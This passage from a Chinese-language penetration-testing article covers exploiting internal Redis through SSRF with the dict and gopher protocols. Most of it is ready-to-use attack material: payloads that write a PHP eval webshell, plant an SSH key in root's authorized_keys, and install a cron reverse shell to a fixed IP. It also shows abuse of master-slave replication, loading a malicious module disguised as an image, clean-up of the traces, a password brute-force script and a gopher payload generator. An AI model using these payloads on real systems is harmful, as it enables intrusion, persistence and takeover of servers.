CLIENT libcurl 7.67.0
aaa
QUIT
 → Qftm :~/Desktop#
```

可以看到字符`?`中起到了截断作用，这里是否可以考虑将其编码呢，答案是：编码无法解决本质问题，因为如果进行一次编码的话服务端默认解码一次，导致dict协议还是无法规避字符`?`，那么编码两次呢，这种肯定是可以规避dict协议的，但是编码两次之后dict协议传入redis执行的命令其中就包含了剩余的一次编码，导致存储的恶意payload关键部分存在编码程序无法解析

一次编码问题验证

```
# 发送请求
?url=dict://127.0.0.1:6379/set:x:%27%3C%3Fphp:eval($_GET[%22qftm%22]);%3F%3E%27

# 响应
-ERR Protocol error: unbalanced quotes in request
```

二次编码问题验证

```
# 发送请求
?url=dict://127.0.0.1:6379/set:x:%27%3C%253Fphp:eval($_GET[%22qftm%22]);%253F%3E%27

# 响应【这里：第一个OK代表set指令成功执行、第二个OK代表dict协议执行完毕的quit退出指令】
+OK
+OK


# 查询二次编码payload存储的数据情况 
?url=dict://127.0.0.1:6379/get%20x

# 响应【可以看到字符`?`被编码】
$32
&lt;%3Fphp eval($_GET["qftm"]);%3F&gt;
+OK
```

从上述实践可以看出来字符`？`无法逃逸解析。
- Bypass
考虑到，常规写入php文件以及短标签方式都被限制，因为他们其中都有字符`?`的存在，那么还有什么办法可以利用`dict`手段写入恶意php程序文件嘛，答案是有的，这里经过探索发现可以使用`&lt;script&gt;`和`ASP`两种代码程序标签格式进行绕过，具体探索分析过程如下

利用条件：

```
php version &lt; 7.0
```

官方在自PHP7.0版本中移除了ASP 和 script PHP 标签 ：[Link](https://www.php.net/manual/zh/migration70.incompatible.php)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01a891e9a6502c006b.png)

对于`ASP`标签来说，默认是关闭的

```
; Allow ASP-style &lt;% %&gt; tags.
; http://php.net/asp-tags
asp_tags = Off
```

这里如果目标站点开启asp标签支持，则可利用payload如下

```
dict://127.0.0.1:6379/flushall
dict://127.0.0.1:6379/set:x:'&lt;% @eval($_GET["qftm"]); %&gt;'
dict://127.0.0.1:6379/config:set:dir:/var/www/html/
dict://127.0.0.1:6379/config:set:dbfilename:test.php
dict://127.0.0.1:6379/save
```

测试效果

```
# 请求（某个特殊payload）
?url=dict://127.0.0.1:6379/set:x:'&lt;% @eval($_GET["qftm"]); %&gt;'

# 响应
+OK 
+OK 

# 查询
?url=dict://127.0.0.1:6379/get:x

# 响应
$27
&lt;% @eval($_GET["qftm"]); %&gt;
+OK
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01422c235c42f8964a.png)

对于`&lt;script&gt;`标签来说默认生效和php短标签配置没有关系也没有什么其它限制

可利用payload如下

```
dict://127.0.0.1:6379/flushall
dict://127.0.0.1:6379/set:x:'&lt;script language="php"&gt;@eval($_GET["qftm"]);&lt;/script&gt;'
dict://127.0.0.1:6379/config:set:dir:/var/www/html/
dict://127.0.0.1:6379/config:set:dbfilename:test.php
dict://127.0.0.1:6379/save
```

测试效果

```
# 请求（某个特殊payload）
?url=dict://127.0.0.1:6379/set:x:'&lt;script language="php"&gt;@eval($_GET["qftm"]);&lt;/script&gt;'

# 响应
+OK 
+OK 

# 查询
?url=dict://127.0.0.1:6379/get:x

# 响应
$53
&lt;script language="php"&gt;@eval($_GET["qftm"]);&lt;/script&gt;
+OK
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01a7e95e48ba89df98.png)

PS：对于dict协议，注意上面使用的Bypass手法最好进行一次URL编码之后在传入其中，避免不必要的问题（编码一次不影响redis指令的解析）

<a class="reference-link" name="%E5%86%99%E5%85%A5SSH%E5%85%AC%E9%92%A5%E5%85%8D%E5%AF%86%E7%99%BB%E5%BD%95"></a>**写入SSH公钥免密登录**

**（1）Gopher协议利用**
- 原始payload
```
flushall
config set dir /root/.ssh/
config set dbfilename authorized_keys
set x "\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDHStzQa4aESwm/Rm/caKPQAblnb6OBCpxpCeahB2WKwnwoT6DuZ1ypzgYTjMEP6BOhySnSatDpdn7wZKUL7ZEaJdSAd0qD/QaHHLFMYvNXrGJQC+9JBvt5X5iUJOx5Ukdu36YXxRib4cw2qhDLnKa2Q96pEInVJcZ02VNxHTvAE+vjhCTQSYPJahin/s/a+IYEcjqyvkiuWVDWg2GMViMwq5Yh/ELZG2KAXNpSNx1TjklXYQVPO2dmPCdUYyy1r+WxEjWLJZPPWQntQc6KiqHmkEGBXGB4fVxScCVR8y2/DEzEqsQcveFWw7mhqfp9kNHP+AOv0wFwL9G8/glZEnGB root@rose\n\n"
save
quit
```
- resp数据格式转换
```
##################### SSRF+Gopher-&gt;Redis Mode Choice #####################
#
# Mode 1：写入 Webshell For Web Service -&gt; Effective dir
#
# Mode 2：写入 SSH Public Key For Linux OS -&gt; /root/.ssh/
#
# Mode 3：写入 定时任务 For CentOS -&gt; /var/spool/cron/
#
# Mode N：待添加 +++++++++++
#
##################### SSRF+Gopher-&gt;Redis Mode Choice #####################
Choice Mode：2
gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0Ax%0D%0A%24394%0D%0A%0A%0Assh-rsa%20AAAAB3NzaC1yc2EAAAADAQABAAABAQDHStzQa4aESwm/Rm/caKPQAblnb6OBCpxpCeahB2WKwnwoT6DuZ1ypzgYTjMEP6BOhySnSatDpdn7wZKUL7ZEaJdSAd0qD/QaHHLFMYvNXrGJQC%2B9JBvt5X5iUJOx5Ukdu36YXxRib4cw2qhDLnKa2Q96pEInVJcZ02VNxHTvAE%2BvjhCTQSYPJahin/s/a%2BIYEcjqyvkiuWVDWg2GMViMwq5Yh/ELZG2KAXNpSNx1TjklXYQVPO2dmPCdUYyy1r%2BWxEjWLJZPPWQntQc6KiqHmkEGBXGB4fVxScCVR8y2/DEzEqsQcveFWw7mhqfp9kNHP%2BAOv0wFwL9G8/glZEnGB%20root%40rose%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2411%0D%0A/root/.ssh/%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%2415%0D%0Aauthorized_keys%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%2A1%0D%0A%244%0D%0Aquit%0D%0A

Process finished with exit code 0
```
- 二次编码：服务端默认会对gopher数据进行一次url解码
```
gopher://127.0.0.1:6379/_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250Ax%250D%250A%2524394%250D%250A%250A%250Assh-rsa%2520AAAAB3NzaC1yc2EAAAADAQABAAABAQDHStzQa4aESwm%2FRm%2FcaKPQAblnb6OBCpxpCeahB2WKwnwoT6DuZ1ypzgYTjMEP6BOhySnSatDpdn7wZKUL7ZEaJdSAd0qD%2FQaHHLFMYvNXrGJQC%252B9JBvt5X5iUJOx5Ukdu36YXxRib4cw2qhDLnKa2Q96pEInVJcZ02VNxHTvAE%252BvjhCTQSYPJahin%2Fs%2Fa%252BIYEcjqyvkiuWVDWg2GMViMwq5Yh%2FELZG2KAXNpSNx1TjklXYQVPO2dmPCdUYyy1r%252BWxEjWLJZPPWQntQc6KiqHmkEGBXGB4fVxScCVR8y2%2FDEzEqsQcveFWw7mhqfp9kNHP%252BAOv0wFwL9G8%2FglZEnGB%2520root%2540rose%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252411%250D%250A%2Froot%2F.ssh%2F%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%252415%250D%250Aauthorized_keys%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A%252A1%250D%250A%25244%250D%250Aquit%250D%250A
```
- 攻击效果
[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01cbcb5cb1e1c407db.png)

**（2）Dict协议利用**
- 组合payload
```
dict://127.0.0.1:6379/flushall
dict://127.0.0.1:6379/config:set:dir:/root/.ssh/
dict://127.0.0.1:6379/config:set:dbfilename:authorized_keys
dict://127.0.0.1:6379/set:x:"\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDHStzQa4aESwm/Rm/caKPQAblnb6OBCpxpCeahB2WKwnwoT6DuZ1ypzgYTjMEP6BOhySnSatDpdn7wZKUL7ZEaJdSAd0qD/QaHHLFMYvNXrGJQC+9JBvt5X5iUJOx5Ukdu36YXxRib4cw2qhDLnKa2Q96pEInVJcZ02VNxHTvAE+vjhCTQSYPJahin/s/a+IYEcjqyvkiuWVDWg2GMViMwq5Yh/ELZG2KAXNpSNx1TjklXYQVPO2dmPCdUYyy1r+WxEjWLJZPPWQntQc6KiqHmkEGBXGB4fVxScCVR8y2/DEzEqsQcveFWw7mhqfp9kNHP+AOv0wFwL9G8/glZEnGB root@rose\n\n"
dict://127.0.0.1:6379/save
```
- 问题探索
在测试第四条payload的时候虽然回显成功，但是，实际上在未处理编码的时候字符串里面的字符`+`在url里面会被当作空格，导致写入的公钥`ssh`无法生效，所以这里进行一次URL编码绕过限制

```
# 请求（编码）
?url=dict://127.0.0.1:6379/set:x:"%5Cn%5Cnssh-rsa%20AAAAB3NzaC1yc2EAAAADAQABAAABAQDHStzQa4aESwm%2FRm%2FcaKPQAblnb6OBCpxpCeahB2WKwnwoT6DuZ1ypzgYTjMEP6BOhySnSatDpdn7wZKUL7ZEaJdSAd0qD%2FQaHHLFMYvNXrGJQC%2B9JBvt5X5iUJOx5Ukdu36YXxRib4cw2qhDLnKa2Q96pEInVJcZ02VNxHTvAE%2BvjhCTQSYPJahin%2Fs%2Fa%2BIYEcjqyvkiuWVDWg2GMViMwq5Yh%2FELZG2KAXNpSNx1TjklXYQVPO2dmPCdUYyy1r%2BWxEjWLJZPPWQntQc6KiqHmkEGBXGB4fVxScCVR8y2%2FDEzEqsQcveFWw7mhqfp9kNHP%2BAOv0wFwL9G8%2FglZEnGB%20root%40rose%5Cn%5Cn"

# 响应
+OK 
+OK 

# 查询
?url=dict://127.0.0.1:6379/get:x

# 响应（正常）
$394


ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDHStzQa4aESwm/Rm/caKPQAblnb6OBCpxpCeahB2WKwnwoT6DuZ1ypzgYTjMEP6BOhySnSatDpdn7wZKUL7ZEaJdSAd0qD/QaHHLFMYvNXrGJQC+9JBvt5X5iUJOx5Ukdu36YXxRib4cw2qhDLnKa2Q96pEInVJcZ02VNxHTvAE+vjhCTQSYPJahin/s/a+IYEcjqyvkiuWVDWg2GMViMwq5Yh/ELZG2KAXNpSNx1TjklXYQVPO2dmPCdUYyy1r+WxEjWLJZPPWQntQc6KiqHmkEGBXGB4fVxScCVR8y2/DEzEqsQcveFWw7mhqfp9kNHP+AOv0wFwL9G8/glZEnGB root@rose


+OK
```
- 攻击效果
同上。

<a class="reference-link" name="%E5%86%99%E5%85%A5%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E5%8F%8D%E5%BC%B9Shell"></a>**写入定时任务反弹Shell**

**（1）Gopher协议利用**
- 原始payload
```
flushall
config set dir /var/spool/cron/
config set dbfilename root
set x '\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/192.33.6.150/9999 0&gt;&amp;1\n\n'
save
quit
```
- resp数据格式转换
```
##################### SSRF+Gopher-&gt;Redis Mode Choice #####################
#
# Mode 1：写入 Webshell For Web Service -&gt; Effective dir
#
# Mode 2：写入 SSH Public Key For Linux OS -&gt; /root/.ssh/
#
# Mode 3：写入 定时任务 For CentOS -&gt; /var/spool/cron/
#
# Mode N：待添加 +++++++++++
#
##################### SSRF+Gopher-&gt;Redis Mode Choice #####################
Choice Mode：3
gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0Ax%0D%0A%2458%0D%0A%0A%0A%2A/1%20%2A%20%2A%20%2A%20%2A%20bash%20-i%20%3E%26%20/dev/tcp/192.33.6.150/9999%200%3E%261%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2416%0D%0A/var/spool/cron/%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%244%0D%0Aroot%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%2A1%0D%0A%244%0D%0Aquit%0D%0A

Process finished with exit code 0
```
- 二次编码：服务端默认会对gopher数据进行一次url解码
```
gopher://127.0.0.1:6379/_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250Ax%250D%250A%252458%250D%250A%250A%250A%252A%2F1%2520%252A%2520%252A%2520%252A%2520%252A%2520bash%2520-i%2520%253E%2526%2520%2Fdev%2Ftcp%2F192.33.6.150%2F9999%25200%253E%25261%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252416%250D%250A%2Fvar%2Fspool%2Fcron%2F%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25244%250D%250Aroot%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A%252A1%250D%250A%25244%250D%250Aquit%250D%250A
```
- 攻击效果（For CentOS）
[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01f03ed0e3a2f39116.png)

**（2）Dict协议利用**
- 组合payload
```
dict://127.0.0.1:6379/flushall
dict://127.0.0.1:6379/set:x:'\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/192.33.6.150/9999 0&gt;&amp;1\n\n'
dict://127.0.0.1:6379/config:set:dir:/var/spool/cron/
dict://127.0.0.1:6379/config:set:dbfilename:root
dict://127.0.0.1:6379/save
```
- 问题探索
直接向url里面传入payload（第二条）会因为特殊字符显示错误

```
-ERR Protocol error: unbalanced quotes in request
```

通过一次编码即可绕过

```
# 请求
?url=dict://127.0.0.1:6379/set:x:'%5Cn%5Cn*%2F1%20*%20*%20*%20*%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.33.6.150%2F9999%200%3E%261%5Cn%5Cn'

# 响应
+OK
+OK

# 查询
?url=dict://127.0.0.1:6379/get:x

# 响应
$62
\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/192.33.6.150/9999 0&gt;&amp;1\n\n
+OK
```
- 攻击效果
同上。

<a class="reference-link" name="ssrf+redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6RCE"></a>**ssrf+redis主从复制RCE**

<a class="reference-link" name="%E5%9F%BA%E4%BA%8E%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E5%86%99%E5%85%A5%E6%81%B6%E6%84%8F%E6%96%87%E4%BB%B6"></a>**基于主从复制写入恶意文件**

在上文的描述中讲到使用`dict`协议遇到的问题，无法写入常规的`shell`【字符`?`无法规避】，当时探索的手法是利用`&lt;script&gt;`标签进行绕过，这里也可以利用主从复制进行绕过，具体过程如下：
- 环境
主服务器【恶意master】

```
192.168.8.185:6379（外网恶意master redis）
redis version 5.0.9
```

从服务器【受害机slave】

```
127.0.0.1:6379（公网IP：192.33.6.144）（内网slave redis）
redis version 4.0.9
```
- 主从复制
设置主从模式 For 从主机

```
?url=dict://127.0.0.1:6379/slaveof:192.168.8.185:6379
```

主主机写入恶意代码：利用主主机写入恶意数据从而复制传入从主机

```
192.168.8.185:6379&gt; set x '&lt;?php eval($_GET["qftm"]);?&gt;'
OK
192.168.8.185:6379&gt;
```

从主机查询同步情况

```
# 请求查询
?url=dict://127.0.0.1:6379/get:x

# 响应结果
$28
&lt;?php eval($_GET["qftm"]);?&gt;
+OK
```

组合payload向从主机（目标主机）写入恶意文件

```
dict://127.0.0.1:6379/config:set:dir:/var/www/html/
dict://127.0.0.1:6379/config:set:dbfilename:test.php
dict://127.0.0.1:6379/save
dict://127.0.0.1:6379/slaveof:no:one
```
- 攻击效果
[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t0165c5f505b78c3076.png)

PS：除了上述写入webshell外，其他情况【写入定时任务、ssh公钥等】如果环境满足也是可以利用的，另外环境在`redis 4.X-5.X`的也可以考虑基于so扩展的主从复制rce。

<a class="reference-link" name="%E5%9F%BA%E4%BA%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0RCE"></a>**基于文件上传RCE**

如果网站存在文件上传漏洞且可以绕过限制上传`so`文件格式应用程序，则可以直接加载该扩展模块以RCE获取目标主机权限。

有利条件：redis加载so扩展模块与文件名称无关【文件名、文件后缀】，这种情况对于网站只做了后缀校验来说利用难度为0。

环境：网站存在ssrf+文件上传漏洞（仅支持图片后缀）

攻击：上传`exp.jpg`，ssrf+dict加载上传的模块rce

攻击效果如下：

```
192.33.6.144:6379&gt; MODULE load /var/www/html/exp.jpg
OK
192.33.6.144:6379&gt; system.exec "id"
"uid=0(root) gid=0(root) \xe7\xbb\x84=0(root)\n"
192.33.6.144:6379&gt;
```

痕迹清理：模块卸载

```
192.33.6.144:6379&gt; module list
1) 1) "name"
   2) "system"
   3) "ver"
   4) (integer) 1
192.33.6.144:6379&gt; MODULE unload system
OK
192.33.6.144:6379&gt; module list
(empty list or set)
192.33.6.144:6379&gt;
```

### <a class="reference-link" name="%E5%86%85%E7%BD%91Redis%E6%8E%88%E6%9D%83+SSRF%E6%94%BB%E5%87%BB"></a>内网Redis授权+SSRF攻击

<a class="reference-link" name="ssrf+%E5%8F%A3%E4%BB%A4%E7%8C%9C%E8%A7%A3"></a>**ssrf+口令猜解**

很多时候在真实环境下，见到的redis存在授权，这个时候如果还想继续利用redis获取目标主机相应权限，就需要先拿到认证授权。

对于内网的redis应用一般的弱密码可以结合ssrf+dict/gopher进行相应的暴力破解获取认证。

<a class="reference-link" name="ssrf+dict%E5%8D%8F%E8%AE%AE%E8%AE%A4%E8%AF%81"></a>**ssrf+dict协议认证**
- payload
```
?url=dict://127.0.0.1:6379/auth:your_password
```
- 认证情况下：默认访问内网redis需要认证
```
# 请求
http://192.33.6.144/index.php?url=dict://127.0.0.1:6379/info

# 响应
-NOAUTH Authentication required.
-NOAUTH Authentication required.
+OK
```
- 测试密码
```
# 请求
http://192.33.6.144/index.php?url=dict://127.0.0.1:6379/auth:redis

# 响应
-NOAUTH Authentication required.
-ERR invalid password
+OK
```
- 这里使用burpsuite进行协助爆破：抓取相应的数据包进行暴力破解
[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01a8efe2e709942cde.png)

<a class="reference-link" name="ssrf+gopher%E5%8D%8F%E8%AE%AE%E8%AE%A4%E8%AF%81"></a>**ssrf+gopher协议认证**

除了使用dict协议进行认证外，同样可以使用gopher协议来进行认证
- payload
```
RESP格式数据:
*2
$4
AUTH
$6
123123
*1
$4
quit

gopher传输的tcp数据（二次编码）
*2%250D%250A%25244%250D%250AAUTH%250D%250A%25246%250D%250A123123%250D%250A*1%250D%250A%25244%250D%250Aquit%250D%250A
```

由于gopher进行认证的话需要控制两个变量，即：密码长度以及密码值，这种情况无法直接使用burpsuite进行认证破解，编写如下爆破脚本进行认证

```
# -*- coding: utf-8 -*-
"""
 @Author: Qftm
 @Data  : 2020/8/1
 @Time  : 17:40
 @IDE   : IntelliJ IDEA
"""
import requests
import urllib

passfile = open("./passwd.txt")

try:
    for line in passfile.readlines():
        passwd = str(line.strip('\n'))
        length = len(passwd)
        #print(passwd)
        passwd = urllib.request.quote(passwd)
        #print(passwd)
        passwd = passwd.replace("%","%25")
        #print(passwd)
        payload = "http://192.33.6.144/index.php?url=gopher://127.0.0.1:6379/_*2%250D%250A%25244%250D%250AAUTH%250D%250A%2524`{`lengths`}`%250D%250A`{`passwds`}`%250D%250A*1%250D%250A%25244%250D%250Aquit%250D%250A".format(lengths=length,passwds=passwd)
        resp = requests.get(url=payload)
        #print(payload)
        #print(resp.text)
        if "-ERR invalid password" not in resp.text:
            print()
            print("###################### Success ######################")
            print("# Url：" + payload)
            print("# Resp:" + str(resp.content))
            print("# Password：" + passwd)
            print("###################### Success ######################")
            print()
            break
        print("+++Test Password：" + passwd + " --&gt;&gt; Failed")
except Exception as e:
    print(e)
```

验证效果

```
+++Test Password：cony --&gt;&gt; Failed
+++Test Password：coolfan --&gt;&gt; Failed
+++Test Password：coolgirl --&gt;&gt; Failed
+++Test Password：coolman --&gt;&gt; Failed
+++Test Password：cpfcpf --&gt;&gt; Failed
+++Test Password：cqisp --&gt;&gt; Failed
+++Test Password：crespo --&gt;&gt; Failed
、、、、、、、、、、
、、、、、、、、、、
+++Test Password：dasanlin --&gt;&gt; Failed
+++Test Password：dave --&gt;&gt; Failed
+++Test Password：david --&gt;&gt; Failed
+++Test Password：db811103 --&gt;&gt; Failed
+++Test Password：dd11 --&gt;&gt; Failed
+++Test Password：dddd --&gt;&gt; Failed
+++Test Password：dddddddd --&gt;&gt; Failed
+++Test Password：ddtt --&gt;&gt; Failed
+++Test Password：dear --&gt;&gt; Failed
+++Test Password：dekai --&gt;&gt; Failed
+++Test Password：dell --&gt;&gt; Failed

###################### Success ######################
# Url：http://192.33.6.144/index.php?url=gopher://127.0.0.1:6379/_*2%250D%250A%25244%250D%250AAUTH%250D%250A%25248%250D%250Adengfeng%250D%250A*1%250D%250A%25244%250D%250Aquit%250D%250A
# Resp:b'+OK\r\n+OK\r\n'
# Password：dengfeng
###################### Success ######################


Process finished with exit code 0
```

<a class="reference-link" name="ssrf+%E5%8F%A3%E4%BB%A4%E8%AE%A4%E8%AF%81%E6%94%BB%E5%87%BB"></a>**ssrf+口令认证攻击**

对于存在认证的redis，当拿到授权密码时就可以利用`gopher`协议协助进行在授权认证的情况下攻击内网redis应用。那么，同样，想一下这里可以利用`dict`协议吗，答案是不可以的，上面说过其特性，每次只能传输单行数据单条完整指令，也就导致其无法像gopher那样一次执行多条指令直接完成认证攻击。

<a class="reference-link" name="ssrf+gopher%E5%8D%8F%E8%AE%AE%E8%AE%A4%E8%AF%81%E6%94%BB%E5%87%BB"></a>**ssrf+gopher协议认证攻击**

通过上面口令猜解获取认证密码之后就可以进行认证攻击，过程如下
- 攻击脚本
```
# -*- coding: utf-8 -*-
"""
 @Author: Qftm
 @Data  : 2020/8/12
 @Time  : 10:31
 @IDE   : IntelliJ IDEA
"""
import urllib

protocol = "gopher://"
ip = "127.0.0.1"
port = "6379"
passwd = "dengfeng"
payload = protocol + ip + ":" + port + "/_"

def redis_resp_format(arr):
    CRLF = "\r\n"
    redis_arr = arr.split(" ")
    cmd = ""
    cmd += "*"+str(len(redis_arr))
    for x in redis_arr:
        cmd += CRLF+"$"+str(len((x.replace("$`{`IFS`}`"," "))))+CRLF+x.replace("$`{`IFS`}`"," ")
    cmd += CRLF
    return cmd

if __name__ == "__main__":

    print("##################### SSRF+Gopher-&gt;Redis Mode Choice #####################")
    print("#")
    print("# Mode 1：写入 Webshell For Web Service -&gt; Effective dir")
    print("#")
    print("# Mode 2：写入 SSH Public Key For Linux OS -&gt; /root/.ssh/")
    print("#")
    print("# Mode 3：写入 定时任务 For CentOS -&gt; /var/spool/cron/")
    print("#")
    print("# Mode N：待添加 +++++++++++")
    print("#")
    print("##################### SSRF+Gopher-&gt;Redis Mode Choice #####################")

    try:
        mode = input("Choice Mode：")
        mode = int(mode)
        if mode == 1:
            shell = "\n\n&lt;?php eval($_GET[\"qftm\"]);?&gt;\n\n"
            dbfilename = "test.php"
            dir = "/var/www/html/"
            # 标志位'$`{`IFS`}`'替换某部分空格，避免后续命令的分割出现问题
            cmd = ["flushall",
                   "set x `{``}`".format(shell.replace(" ","$`{`IFS`}`")),
                   "config set dir `{``}`".format(dir),
                   "config set dbfilename `{``}`".format(dbfilename),
                   "save",
                   "quit"
                   ]
            if passwd:
                cmd.insert(0,"AUTH `{``}`".format(passwd))
            for x in cmd:
                payload += urllib.request.quote(redis_resp_format(x))
            print(payload)
        elif mode == 2:
            ssh_key_pub = "\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDHStzQa4aESwm/Rm/caKPQAblnb6OBCpxpCeahB2WKwnwoT6DuZ1ypzgYTjMEP6BOhySnSatDpdn7wZKUL7ZEaJdSAd0qD/QaHHLFMYvNXrGJQC+9JBvt5X5iUJOx5Ukdu36YXxRib4cw2qhDLnKa2Q96pEInVJcZ02VNxHTvAE+vjhCTQSYPJahin/s/a+IYEcjqyvkiuWVDWg2GMViMwq5Yh/ELZG2KAXNpSNx1TjklXYQVPO2dmPCdUYyy1r+WxEjWLJZPPWQntQc6KiqHmkEGBXGB4fVxScCVR8y2/DEzEqsQcveFWw7mhqfp9kNHP+AOv0wFwL9G8/glZEnGB root@rose\n\n"
            dbfilename = "authorized_keys"
            dir = "/root/.ssh/"
            # 标志位'$`{`IFS`}`'替换某部分空格，避免后续命令的分割出现问题
            cmd=["flushall",
                 "set x `{``}`".format(ssh_key_pub.replace(" ","$`{`IFS`}`")),
                 "config set dir `{``}`".format(dir),
                 "config set dbfilename `{``}`".format(dbfilename),
                 "save",
                 "quit"
                 ]
            if passwd:
                cmd.insert(0,"AUTH `{``}`".format(passwd))
            for x in cmd:
                payload += urllib.request.quote(redis_resp_format(x))
            print(payload)
        elif mode == 3:
            crontab = "\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/192.33.6.150/9999 0&gt;&amp;1\n\n"
            dbfilename = "root"
            dir = "/var/spool/cron/"
            # 标志位'$`{`IFS`}`'替换某部分空格，避免后续命令的分割出现问题
            cmd = ["flushall",
                   "set x `{``}`".format(crontab.replace(" ","$`{`IFS`}`")),
                   "config set dir `{``}`".format(dir),
                   "config set dbfilename `{``}`".format(dbfilename),
                   "save",
                   "quit"
                   ]
            if passwd:
                cmd.insert(0,"AUTH `{``}`".format(passwd))
            for x in cmd:
                payload += urllib.request.quote(redis_resp_format(x))
            print(payload)

    except Exception as e:
        print(e)
```
- 初次payload（含认证）
```
##################### SSRF+Gopher-&gt;Redis Mode Choice #####################
#
# Mode 1：写入 Webshell For Web Service -&gt; Effective dir
#
# Mode 2：写入 SSH Public Key For Linux OS -&gt; /root/.ssh/
#
# Mode 3：写入 定时任务 For CentOS -&gt; /var/spool/cron/
#
# Mode N：待添加 +++++++++++
#
##################### SSRF+Gopher-&gt;Redis Mode Choice #####################
Choice Mode：1
gopher://127.0.0.1:6379/_%2A2%0D%0A%244%0D%0AAUTH%0D%0A%248%0D%0Adengfeng%0D%0A%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0Ax%0D%0A%2432%0D%0A%0A%0A%3C%3Fphp%20eval%28%24_GET%5B%22qftm%22%5D%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2414%0D%0A/var/www/html/%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%248%0D%0Atest.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%2A1%0D%0A%244%0D%0Aquit%0D%0A

Process finished with exit code 0
```
- 最终payload（含认证、二次编码）
```
